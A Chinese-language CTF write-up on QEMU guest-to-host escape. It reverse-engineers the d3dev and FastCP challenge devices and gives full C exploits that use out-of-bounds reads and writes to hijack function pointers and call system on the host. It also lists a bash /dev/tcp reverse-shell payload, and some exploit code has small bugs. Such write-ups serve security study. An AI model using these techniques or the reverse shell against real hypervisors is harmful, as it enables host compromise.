# 一、QEMU逃逸  --  basic 

> ~~玩不懂kernel的菜鸡来霍霍qemu辣~~

## 0x00 lspci

pci外设地址，形如`0000:00:1f.1`。第一个部分16位表示域；第二个部分8位表示总线编号；第三个部分5位表示设备号；最后一个部分3位表示功能号。下面是`lspci`的输出，其中`pci`设备的地址，在最头部给出，由于`pc`设备总只有一个0号域，所以会省略域。

![image](https://p4.ssl.qhimg.com/t01e511a0ccabc44633.png)

`lspci -v -t`会用树状图的形式输出pci设备，会显得更加直观

![image](https://p2.ssl.qhimg.com/t0106de490068b32c99.png)

`lspci -v`就能输出设备的详细信息

![image](https://p0.ssl.qhimg.com/t01a78f0178e71b000f.png)

仔细观察相关的输出，可以从中知道`mmio`的地址是`0xfebf1000`，`pmio`的端口是`0xc050`。

![image](https://p1.ssl.qhimg.com/t0129b36299082dc698.png)

在`/sys/bus/pci/devices`可以找到每个总线设备相关的一写文件。

![image](https://p3.ssl.qhimg.com/t01ddba05509f456110.png)

![image](https://p0.ssl.qhimg.com/t016c20a809c748def6.png)

每个设备的目录下`resource0` 对应`MMIO`空间。`resource1` 对应`PMIO`空间。
`resource`文件里面会记录相关的数据，第一行就是`mimo`的信息，从左到右是：起始地址、结束地址、标识位。

## 0x01  AntCTF 2021 d3dev

### 1. 分析

```sh
#!/bin/sh
./qemu-system-x86_64 \
-L pc-bios/ \
-m 128M \
-kernel vmlinuz \
-initrd rootfs.img \
-smp 1 \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet" \
-device d3dev \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic \
-monitor /dev/null
```

启动脚本中出现``-device d3dev``

使用IDA pro反汇编qemu，查找d3dev

在`d3dev_class_init()`函数中找到注册了PCI设备d3dev

其中

````c
  LODWORD(v2[2].object_cast_cache[0]) = 0x11E82333;
  BYTE4(v2[2].object_cast_cache[0]) = 0x10;
  HIWORD(v2[2].object_cast_cache[0]) = 0xFF;
````

可以知道d3dev设备的Device id（0x11E8）和Vendor id（0x2333）

之后在``pci_d3dev_realize()``函数中可以找到该设备MMIO和PMIO的读写操作函数，且MMIO的内存大小为0x800，PMIO的内存大小为0x20，在读写的时候如果访问的地址在其范围内则会调用相关的读写函数

````c
void __fastcall pci_d3dev_realize(PCIDevice_0 *pdev, Error_0 **errp)
{
  memory_region_init_io(
    (MemoryRegion_0 *)&pdev[1],
    &pdev->qdev.parent_obj,
    &d3dev_mmio_ops,
    pdev,
    "d3dev-mmio",
    0x800uLL);
  pci_register_bar(pdev, 0, 0, (MemoryRegion_0 *)&pdev[1]);
  memory_region_init_io(
    (MemoryRegion_0 *)&pdev[1].name[56],
    &pdev->qdev.parent_obj,
    &d3dev_pmio_ops,
    pdev,
    "d3dev-pmio",
    0x20uLL);
  pci_register_bar(pdev, 1, 1u, (MemoryRegion_0 *)&pdev[1].name[56]);
}
````

之后查看mmio和pmio的读写函数，但是在详细分析之前修改这些函数的第一个参数

第一个参数默认为`void *opaque`

但是明显可以看到他是一个指向自定义结构体的指针，我们可以：

> 选中opaque  ->  右键Convert to struct*  ->  d3devState

具体的结构体名词可以在`pci_d3dev_realize()`函数中查看汇编查看

![](https://pic1.imgdb.cn/item/6357cdda16f2c2beb1c3ed00.png)

可以在IDA中详细查看这个结构体的定义

````c
00000000 d3devState struc ; (sizeof=0x1300, align=0x10, copyof_4545)
00000000 pdev PCIDevice_0 ?
000008E0 mmio MemoryRegion_0 ?
000009D0 pmio MemoryRegion_0 ?
00000AC0 memory_mode dd ?
00000AC4 seek dd ?
00000AC8 init_flag dd ?
00000ACC mmio_read_part dd ?
00000AD0 mmio_write_part dd ?
00000AD4 r_seed dd ?
00000AD8 blocks dq 257 dup(?)
000012E0 key dd 4 dup(?)
000012F0 rand_r dq ?                             ; offset
000012F8 db ? ; undefined
000012F9 db ? ; undefined
000012FA db ? ; undefined
000012FB db ? ; undefined
000012FC db ? ; undefined
000012FD db ? ; undefined
000012FE db ? ; undefined
000012FF db ? ; undefined
00001300 d3devState ends
00001300
````

之后分析mmio_read和mmio_write的操作

根据IDA可以看出，`d3dev_mmio_read()`该函数首先通过`seek`和`addr`来从`opaque->blocks`中取出`block`，然后经过`tea`编码后，返回给用户。

从上面数据结构中，可知`block`的长度为`0x100`，而我们这里传入的`addr`并没有检查范围，所以可以超过`0x100`，从而发生越界读取。而这里越界之后，可以读取`key`和`rand_r`的值。

接着看`d3dev_write`:该函数主要是将传入的`val`赋值给`opaque->blocks[offset]`。如果是奇数次，则直接赋值。如果是偶数次则先加密再赋值。这里也没有对`addr`进行范围检查，可以越界写。

之后`d3dev_pmio_read()`

![](https://pic1.imgdb.cn/item/6357d1ad16f2c2beb1c9063b.png)

`d3dev_pmio_read`基本功能就是，通过输入不同的`addr`，会进入不同`switch-case`。这里就会将`opaque->key`的四个值进行返回。

`d3dev_pmio_write`会去调用`rand_r`函数指针，这个指针存储的是`rand`函数地址。

![](https://pic1.imgdb.cn/item/6357d23b16f2c2beb1c9c6f4.png)

### 2. 漏洞利用

利用mmio_read的越界读获得key值和rand_r的值，其中rand_r保存的rand函数的地址，实现泄露地址，我们通过越界读泄漏该地址，那么就可以得到`qemu`的基址。

得到了`qemu`基址后，我们就可以计算得到`system`函数的地址。

然后通过越界写，修改`rand_r`存储的函数指针为`system`。然后去触发`system`函数。

在`d3dev_mmio_write`函数中的越界写可以直接修改结构体中的数据，两个分支一个可以直接覆写4字节，另一个经过加密后可以覆写8字节；`d3dev_mmio_read`读取的数据要经过随机数key和key1进行加密，可以通过越界写将两处key内存覆盖为0或在`d3dev_pmio_write`函数中将两处key都设置为0

这里想实现`getshell`，可以去执行`rand_r`函数，并设置参数为`sh`。

查看mmio和pmio基地址的方法：

````sh
/sys/devices/pci0000:00/0000:00:03.0 # cat resource
0x00000000febf1000 0x00000000febf17ff 0x0000000000040200
0x000000000000c040 0x000000000000c05f 0x0000000000040101

````

其中0x00000000febf1000就是mmio地址；0x000000000000c040就是pmio地址

### 3. Exploit

````c
#include<stdint.h>
#include<fcntl.h>
#include<sys/mman.h>
#include<sys/io.h>
#include<stdio.h>
#include<unistd.h>

unsigned char* mmio_mem;

void Err(char * err){
    printf("Error: %s\n",err);
    exit(-1);
}

void init_pmio(){
    iopl(3); // 0x3ff 以上端口全部开启访问
}

void init_mmio(){
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0",O_RDWR|O_SYNC);
    mmio_mem = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,0);
}

void mmio_write(uint32_t addr,uint32_t value){
    *(uint32_t*)(mmio_mem+addr) = value;
}

uint64_t mmio_read(uint64_t addr){
    return *(uint64_t*)(mmio_mem+addr); 
}

uint32_t pmio_base = 0xc040;

void pmio_write(uint32_t addr,uint32_t value){
    outl(value,pmio_base+addr);
}

uint64_t pmio_read(uint32_t addr){
    return (uint64_t)inl(pmio_base+addr);
}

uint64_t encode(uint32_t high, uint32_t low) {

    uint32_t addr = 0xC6EF3720;

    for (int i = 0; i < 32; ++i) {
        high = high - ((low + addr) ^ (low >> 5) ^ (16 * low));
        low = low - (((high + addr) ^ (high >> 5) ^ (16 * high)));
        addr += 0x61C88647;
    }

    return (uint64_t)high * 0x100000000 + low;
}

uint64_t decode(uint32_t high, uint32_t low) {

    uint32_t addr = 0x0;

    for (int i = 0; i < 32; ++i) {
        addr -= 0x61C88647;
        low += (((high + addr) ^ (high >> 5) ^ (16 * high)));
        high += ((low + addr) ^ (low >> 5) ^ (16 * low));
    }

    return (uint64_t)high * 0x100000000 + low;
}

int main(){
    printf("init pci and mmio:\n");
    init_pmio();
    init_mmio();

    printf("set seek = 0x100\n");
    pmio_write(0x8,0x100);
    printf("set key = 0x0\n");
    pmio_write(0x4,0);


    printf("oob read rand_r\n");
    uint64_t value = mmio_read(3*8);
    printf("%lx\n",value);

    uint64_t rand_r = decode(value>>32, value&0xffffffff);
    printf("%lx\n", rand_r);

    uint64_t system_addr = rand_r+0xa560;
    printf("system_addr ==> %lx\n", system_addr);

    uint64_t encode_system = encode(system_addr>>32, system_addr&0xffffffff);
    printf("encode_system ==> %lx\n", encode_system);

    uint32_t es_low  = encode_system % 0x100000000;
    uint32_t es_high = encode_system / 0x100000000;

    printf("oob write\n");
    mmio_write(3*8, es_low);
    sleep(1);
    mmio_write(3*8, es_high);

    printf("set seek=0x0\n");
    pmio_write(0x8, 0x0);


    pmio_write(0x1c,0x6873); // 0x6873 == "sh"

}

````

````sh
#!bash
gcc expliot.c -o expliot --static &&\
chmod +x expliot &&\
cp ./expliot ./cpio-root/expliot &&\
cd ./cpio-root &&\
find . | cpio -o --format=newc > ../rootfs.img
````

## 0x02 HWS2021 FastCP

### 1. 分析

````bas
#!/bin/sh

./qemu-system-x86_64 -initrd ./rootfs.img -nographic -kernel ./vmlinuz-5.0.5-generic -append "priority=low console=ttyS0" -monitor /dev/null --device FastCP

````

可以看到有设备FastCP

````c
void __fastcall pci_FastCP_realize(PCIDevice_0 *pdev, Error_0 **errp)
{
  Object_0 *v2; // rbp

  v2 = object_dynamic_cast_assert(
         &pdev->qdev.parent_obj,
         "FastCP",
         "/root/source/qemu/hw/misc/fastcp.c",
         258,
         "pci_FastCP_realize");
  pdev->config[61] = 1;
  if ( !msi_init(pdev, 0, 1u, 1, 0, errp) )
  {
    timer_init_full(
      (QEMUTimer_0 *)&v2[166].properties,
      0LL,
      QEMU_CLOCK_VIRTUAL,
      (int)&stru_F4240,
      0,
      fastcp_cp_timer,
      v2);
    memory_region_init_io(
      (MemoryRegion_0 *)&v2[57].free,
      v2,
      &fastcp_mmio_ops,
      v2,
      "fastcp-mmio",
      (uint64_t)&stru_100000);
    pci_register_bar(pdev, 0, 0, (MemoryRegion_0 *)&v2[57].free);
    HIDWORD(v2[63].parent) = 0;
  }
}
````

主要有mmio操作和cp_timer操作

接下来分析mmio_read操作

![](https://pic1.imgdb.cn/item/6358f67116f2c2beb1334b2c.png)

可以看到如果size==8 ，根据addr的不同返回不同的数据，

其中为了控制size==0需要设置addr为`uint64_t`类型

接下来分析mmio_write

![](https://pic1.imgdb.cn/item/6358f82716f2c2beb136cffd.png)

当addr==24的时候不仅设置cmd，还触发时钟函数``timer_mod``

之后分析``fastcp_cp_timer``函数

![](https://pic1.imgdb.cn/item/6358fa8116f2c2beb13b7715.png)

timer函数根据传入的参数cmd来选择执行的分支

![](https://pic1.imgdb.cn/item/6358fbce16f2c2beb13db48c.png)

漏洞很明显位于在命令为 1 且 CP_list_cnt 大于 0x10 的时候，复制前没有检测 CP_cnt 是否会大于 0x1000 字节，而在 FastCPState 的结构中（结构如下）

````
00000000 FastCPState struc ; (sizeof=0x1A30, align=0x10, copyof_4530)
00000000 pdev PCIDevice_0 ?
000008F0 mmio MemoryRegion_0 ?
000009E0 cp_state CP_state ?
000009F8 handling db ?
000009F9 db ? ; undefined
000009FA db ? ; undefined
000009FB db ? ; undefined
000009FC irq_status dd ?
00000A00 CP_buffer db 4096 dup(?)
00001A00 cp_timer QEMUTimer_0 ?
00001A30 FastCPState ends
````

可以看出CP_buffer只有0x1000字节。

通过`pagemap`将虚拟机中的虚拟地址转换为物理地址。

根据内核文档可知，每个虚拟页在`/proc/pid/pagemap`中对应一项长度为`64 bits`的数据，其中`Bit 63`为`page present`，表示物理内存页是否已存在；若物理页已存在，则`Bits 0-54`表示物理页号，此外，需要`root`权限的进程才能读取`/proc/pid/pagemap`中的内容。

```
pagemap is a new (as of 2.6.25) set of interfaces in the kernel that allow
userspace programs to examine the page tables and related information by
reading files in /proc.

There are four components to pagemap:

*/proc/pid/pagemap. This file lets a userspace process find out which
physical frame each virtual page is mapped to. It contains one 64-bit
value for each virtual page, containing the following data (from
fs/proc/task_mmu.c, above pagemap_read):

* Bits 0-54 page frame number (PFN) if present
* Bits 0-4 swap type if swapped
* Bits 5-54 swap offset if swapped
* Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)
* Bit 56 page exclusively mapped (since 4.2)
* Bits 57-60 zero
* Bit 61 page is file-page or shared-anon (since 3.5)
* Bit 62 page swapped
* Bit 63 page present

Since Linux 4.0 only users with the CAP_SYS_ADMIN capability can get PFNs.
In 4.0 and 4.1 opens by unprivileged fail with -EPERM. Starting from
4.2 the PFN field is zeroed if the user does not have CAP_SYS_ADMIN.
Reason: information about PFNs helps in exploiting Rowhammer vulnerability.
```

根据以上信息，利用`/proc/pid/pagemap`可将虚拟地址转换为物理地址，具体步骤如下：

1、 计算虚拟地址所在虚拟页对应的数据项在`/proc/pid/pagemap`中的偏移，`offset=(viraddr/pagesize)*sizeof(uint64_t)`

2、 读取长度为`64bits`的数据项

3、 根据`Bit 63` 判断物理内存页是否存在

4、 若物理内存页已存在，则取`bits 0-54`作为物理页号

5、 计算出物理页起始地址加上页内偏移即得到物理地址，`phtaddr = pageframenum * pagesize + viraddr % pagesize`

对应代码如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>   
#include <stdint.h>

size_t va2pa(void *addr){
    uint64_t data;

    int fd = open("/proc/self/pagemap",O_RDONLY);
    if(!fd){
        perror("open pagemap");
        return 0;
    }

    size_t pagesize = getpagesize();
    size_t offset = ((uintptr_t)addr / pagesize) * sizeof(uint64_t);

    if(lseek(fd,offset,SEEK_SET) < 0){
        puts("lseek");
        close(fd);
        return 0;
    }

    if(read(fd,&data,8) != 8){
        puts("read");
        close(fd);
        return 0;
    }

    if(!(data & (((uint64_t)1 << 63)))){
        puts("page");
        close(fd);
        return 0;
    }

    size_t pageframenum = data & ((1ull << 55) - 1);
    size_t phyaddr = pageframenum * pagesize + (uintptr_t)addr % pagesize;

    close(fd);

    return phyaddr;
}

int main(){
    char *userbuf;
    uint64_t userbuf_pa;
    unsigned char* mmio_mem;

    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1){
        perror("open mmio");
        exit(-1);
    }

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED){
        perror("mmap mmio");
        exit(-1);
    }

    printf("mmio_mem:\t%p\n", mmio_mem);

    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (userbuf == MAP_FAILED){
        perror("mmap userbuf");
        exit(-1);
    }

    strcpy(usebuf,"test");

    mlock(userbuf, 0x1000);
    userbuf_pa = va2pa(userbuf);

    printf("userbuf_va:\t%p\n",userbuf);
    printf("userbuf_pa:\t%p\n",(void *)userbuf_pa);
}
```

### 2. 漏洞利用

- 通过溢出的读取，泄露 cp_timer 结构体，其中存在 PIE 基址（计算出 system@plt 的地址）和堆地址（整个结构的位置在堆上，计算出结构的开始位置，才能得到我们写入 system 参数的位置）。
- 通过溢出的写入，覆盖 cp_timer 结构体控制程序执行流

触发时钟可以利用两种方式：

- 虚拟机重启或关机的时候会触发时钟，调用 cb(opaque)
- 在 MMOI WRITE 中可以触发时钟

system 执行内容：

- cat /flag
- 反弹 shell，/bin/bash -c ‘bash -i >& /dev/tcp/ip/port 0>&1’，在 QEMU 逃逸中，执行 system(“/bin/bash”) 是无法拿到 shell 的，或者说是无法与 shell 内容交互的，必须使用反弹 shell 的形式才能够拿到 shell。
- 弹出计算器，gnome-calculator，这个大概比较适合用于做演示视频吧。

注意：所有在设备中的操作地址都是指 QEMU 模拟的物理地址，但是程序中使用 mmap 申请的是虚拟地址空间。所以要注意使用 mmap 申请出来的超过一页的部分，在物理空间上不连续。如果需要操作那块空间，需要使用那一页的虚拟地址重新计算对应的物理地址。这个性质在这道题中（超过 0x1000 的物理地址复制），需要额外的注意。

### 3. Exploit

````c
#include<stdint.h>
#include<fcntl.h>
#include<sys/mman.h>
#include<sys/io.h>
#include<stdio.h>
#include<unistd.h>

#define PAGE_SHIFT 12
#define PAGE_SIZE (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN ((1ull << 55) - 1)

unsigned char* mmio_mem;
char* userbuf;
uint64_t phy_userbuf,phy_userbuf2;

struct FastCP_CP_INFO
{
    uint64_t CP_src;
    uint64_t CP_cnt;
    uint64_t CP_dst;
};


struct QEMUTimer
{
    int64_t expire_time;
    int64_t timer_list;
    int64_t cb;
    void * opaque;
    int64_t next;
    int attributes;
    int scale;
    char shell[0x50];
};


void Err(char * err){
    printf("Error: %s\n",err);
    exit(-1);
}

uint64_t page_offset(uint64_t addr){
    return addr & ((1 << PAGE_SHIFT) - 1)
}

uint64_t gva_to_gfn(void* addr)
{
    uint64_t pme, gfn;
    size_t offset;

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0)
    {
        die("open pagemap");
    }
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    return gfn;
}

uint64_t gva_to_gpa(void* addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

void init_mmio(){
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",O_RDWR|O_SYNC);
    mmio_mem = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,0);
}

void mmio_write(uint32_t addr,uint32_t value){
    *(uint32_t*)(mmio_mem+addr) = value;
}

uint64_t mmio_read(uint64_t addr){
    return *(uint64_t*)(mmio_mem+addr); 
}

void fastcp_set_list_src(uint64_t list_addr)
{
    mmio_write(0x8, list_addr);
}

void fastcp_set_cnt(uint64_t cnt)
{
    mmio_write(0x10, cnt);
}

void fastcp_do_cmd(uint64_t cmd)
{
    mmio_write(0x18, cmd);
}

void fastcp_do_readfrombuffer(uint64_t addr,uint64_t len){
    struct FastCP_CP_INFO info;
    info.CP_cnt = len;
    info.CP_src = NULL;
    info.CP_dst = addr;
    memcpy(userbuf,&info,sizeof(info));
    fastcp_set_cnt(1);
    fastcp_set_list_src(phy_userbuf);
    fastcp_do_cmd(4);
    sleep(1);
}

void fastcp_do_writetobuffer(uint64_t addr, uint64_t len)
{
    struct FastCP_CP_INFO info;
    info.CP_cnt = len;
    info.CP_src = addr;
    info.CP_dst = NULL;
    memcpy(userbuf, &info, sizeof(info));
    fastcp_set_cnt(1);
    fastcp_set_list_src(phy_userbuf);
    fastcp_do_cmd(2);
    sleep(1);
}

void fastcp_do_movebuffer(uint64_t srcaddr, uint64_t dstaddr, uint64_t len)
{
    struct FastCP_CP_INFO info[0x11];
    for (int i = 0; i < 0x11; i++)
    {
        info[i].CP_cnt = len;
        info[i].CP_src = srcaddr;
        info[i].CP_dst = dstaddr;
    }
    memcpy(userbuf, &info, sizeof(info));
    fastcp_set_cnt(0x11);
    fastcp_set_list_src(phy_userbuf);
    fastcp_do_cmd(1);
    sleep(1);
}


int main(){
    printf("[*] init pci and mmio:\n");
    init_mmio();
    printf("[*] mmio_mem: %p\n",mmio_mem);

    userbuf = mmap(0,0x2000,PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    mlock(userbuf,0x10000); // 锁定物理内存

    phy_userbuf = gva_to_gpa(userbuf);
    
    printf("[*] user buff virtual address: %p\n", userbuf);
    printf("[*] user buff physical address: %p\n", (void*)phy_userbuf);

    fastcp_do_readfrombuffer(phy_userbuf, 0x1030);
    fastcp_do_writetobuffer(phy_userbuf + 0x1000, 0x30);
    fastcp_do_readfrombuffer(phy_userbuf, 0x30);

    uint64_t leak_timer = *(uint64_t*)(&userbuf[0x10]);
    printf("leaking timer: %p\n", (void*)leak_timer);
    fastcp_set_cnt(1);
    uint64_t pie_base = leak_timer - 0x4dce80;
    printf("pie_base: %p\n", (void*)pie_base);
    uint64_t system_plt = pie_base + 0x2C2180;
    printf("system_plt: %p\n", (void*)system_plt);

    uint64_t struct_head = *(uint64_t*)(&userbuf[0x18]);

    struct QEMUTimer timer;
    memset(&timer, 0, sizeof(timer));
    timer.expire_time = 0xffffffffffffffff;
    timer.timer_list = *(uint64_t*)(&userbuf[0x8]);
    timer.cb = system_plt;
    timer.opaque = struct_head + 0xa00 + 0x1000 + 0x30;
    strcpy(&timer.shell, "gnome-calculator");
    memcpy(userbuf + 0x1000, &timer, sizeof(timer));
    fastcp_do_movebuffer(gva_to_gpa(userbuf + 0x1000) - 0x1000, gva_to_gpa(userbuf + 0x1000) - 0x1000, 0x1000 + sizeof(timer));
    fastcp_do_cmd(1);

    return 0;
}
````

